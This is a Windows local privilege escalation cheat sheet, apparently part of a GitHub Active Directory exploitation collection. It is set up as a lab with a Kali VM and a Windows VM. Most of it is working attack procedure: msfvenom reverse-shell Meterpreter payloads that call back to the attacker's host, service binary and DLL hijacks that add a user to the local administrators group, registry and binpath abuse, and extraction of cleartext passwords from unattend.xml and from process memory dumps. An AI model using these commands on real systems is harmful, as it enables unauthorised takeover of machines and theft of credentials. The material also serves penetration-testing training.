## LOCAL PRIVILEGE ESCALATION

### Basic Privilege escalation
```powershell
1. Service Enumeration
Get-ServiceUnquoted                 #   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           #   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               #   returns services the current user can modify
Get-ServiceDetail                   #   returns detailed information about a specified service

2. Service Abuse
Invoke-ServiceAbuse                 #   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 #   writes out a patched C # service binary that adds a local admin or executes a custom command
Install-ServiceBinary               #   replaces a service binary with one that adds a local admin or executes a custom command
Restore-ServiceBinary               #   restores a replaced service binary with the original executable

3. DLL Hijacking
Find-ProcessDLLHijack               #   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  #   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     #   writes out a hijackable DLL

4. Registry Checks
Get-RegistryAlwaysInstallElevated   #  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               #   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       #   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns

5. Miscellaneous Checks
Get-ModifiableScheduledTaskFile     #   find schtasks with modifiable target files
Get-UnattendedInstallFile           #   finds remaining unattended installation files
Get-Webconfig                       #   checks for any encrypted web.config strings
Get-ApplicationHost                 #   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                #   retrieves the plaintext passwords for any found McAfee`'s SiteList.xml files
Get-CachedGPPPassword               #   checks for passwords in cached Group Policy Preferences files

6. Other Helpers/Meta-Functions
Get-ModifiablePath                  #   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        #   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     #   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  #   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          #   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    #   write out a MSI installer that prompts for a user to be added

7. Check ALL
Invoke-AllChecks                    #   runs all current escalation checks and returns a report
```
---
## Autorun
### Detection
Windows VM
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. In Autoruns, click on the ‘Logon’ tab.
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.
### Exploitation
Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
7. Copy the generated file, program.exe, to the Windows VM.

Windows VM
1. Place program.exe in ‘C:\Program Files\Autorun Program’.
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali VM
1. Wait for a new session to open in Metasploit.
2. In Metasploit (msf > prompt) type: sessions -i [Session ID]
3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

---
## AlwaysInstallElevated
### Detection
Windows VM
1. Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
2. From the output, notice that “AlwaysInstallElevated” value is 1
3. In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
4. From the output, notice that “AlwaysInstallElevated” value is 1
### exploitation
Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
7. Copy the generated file, setup.msi, to the Windows VM.

Windows VM
1. Place ‘setup.msi’ in ‘C:\Temp’.
2. Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
3. It  is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators

---
## Registry
### Detection
Windows VM
1. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
2. Notice that the output suggests that user belong to “NT  AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry  key.

### Exploitation
Windows VM
1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.

Kali VM
1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
3. Copy the generated file x.exe, to the Windows VM.

Windows VM
1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
3. In the command prompt type: sc start regsvc
4.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators

---
## Exec Path
### Detection
Windows VM
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

### Exploitation
Windows VM
1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
2. In command prompt type: sc start filepermsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators

---
## Startup Applications
### Detection 
Windows VM
1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
### Exploitation
Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
7. Copy the generated file, x.exe, to the Windows VM.
Windows VM
1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
2. Logoff.
3. Login with the administrator account credentials.
Kali VM
1. Wait for a session to be created, it may take a few seconds.
2. In Meterpreter(meterpreter > prompt) type: getuid
3. From the output, notice the user is “User-PC\Admin”

---
## DLL Hijacking
### Detection
Windows VM
1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to  the attacker’s host for analysis during run time. Alternatively, the  same software can be installed on the attacker’s host for analysis, in  case they can obtain it. To simulate this, right click on Procmon.exe  and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads “Process Name is dllhijackservice.exe then  Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results  shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it  could not do that as the file was not found. Note that ‘C:\Temp’ is a  writable location.
### Exploitation
Windows VM
1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

Kali VM
1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
3. Copy the generated file hijackme.dll, to the Windows VM.
Windows VM
1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators

---
## BinPath
### Detection
Windows VM
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
### Exploitation
Windows VM
1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
2. In command prompt type: sc start daclsvc
3. It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators

---
## Unquoted Service Paths 
### Detection
Windows VM
1. Open command prompt and type: sc qc unquotedsvc
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
### Exploitation
Kali VM
1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
2. Copy the generated file, common.exe, to the Windows VM.

Windows VM
1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: sc start unquotedsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators

---
## Hot Potato
### Exploitation
Windows VM
1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators

---
## Configuration Files 
### Exploitation
Windows VM
1. Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
2.  Scroll down to the "Password" property and copy the base64 string that is confined between the "Value" tags underneath it.

Kali VM
1. In a terminal, type: echo [copied base64] | base64 -d
2. Notice the cleartext password

---
## Memory 
### Exploitation
Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
3. In Metasploit (msf > prompt) type: set uripath x
4. In Metasploit (msf > prompt) type: run

Windows VM
1. Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
2. Open command prompt and type: taskmgr
3. In  Windows Task Manager, right-click on the “iexplore.exe” in the "Image  Name" columnand select “Create Dump File” from the popup menu.
4. Copy the generated file, iexplore.DMP, to the Kali VM.

Kali VM
1. Place 'iexplore.DMP' on the desktop.
2. Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
3. Select the Copy the Base64 encoded string.
4. In command prompt type: echo -ne [Base64 String] | base64 -d
5. Notice the credentials in the output.

---
## Stuff
- PowerUp Misconfiguration Abuse
- Powerless (bat version OSCP prepair)
- BeRoot General Priv Esc Enumeration Tool
- Privesc General Priv Esc Enumeration Tool
- FullPowers Restore A Service Account's Privileges
- Juicy Potato Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation, warning Works only until Windows Server 2016 and Windows 10 until patch 1803
- Lovely Potato Automated Juicy Potato, warning Works only until Windows Server 2016 and Windows 10 until patch 1803
- PrintSpoofer Exploit the PrinterBug for System Impersonation
- Pray Works for Windows Server 2019 and Windows 10
- RoguePotato Upgraded Juicy Potato
- Pray Works for Windows Server 2019 and Windows 10
- Abusing Token Privileges
- SMBGhost CVE-2020-0796

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)